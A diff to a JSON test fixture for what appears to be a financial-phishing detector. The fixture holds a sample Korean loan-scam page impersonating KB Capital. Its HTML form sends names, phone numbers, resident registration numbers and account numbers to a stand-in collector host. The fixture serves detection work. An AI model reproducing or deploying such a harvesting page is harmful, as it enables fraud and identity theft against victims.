@@ -2,7 +2,7 @@
   "analysis_id": "card_capital_001",
   "original_url": "https://kbcapital-loan.example/promotion",
   "final_url": "https://secure-kbcapital.example/loan/apply",
-  "screenshot_path": "C:\\financial-phishing\\multimodal\\fixtures\\card_capital\\test.png",
+  "screenshot_path": "test.png",
   "page_text": "KB캐피탈 긴급 저금리 대환대출 대상자 안내 오늘 마감 한도 5,000만원 금리 연 3.2% 본인인증 후 즉시 승인 이름, 휴대전화번호, 주민등록번호, 계좌번호를 입력해 주세요.",
   "html": "<html><body><header>KB캐피탈</header><main><h1>긴급 저금리 대환대출</h1><p>오늘 마감 · 본인인증 후 즉시 승인</p><form action=\"https://collector.example/loan/submit\" method=\"post\"><input name=\"name\" type=\"text\"><input name=\"phone\" type=\"tel\"><input name=\"resident_number\" type=\"text\"><input name=\"account_number\" type=\"text\"><button>대출 신청</button></form></main></body></html>",
   "forms": [
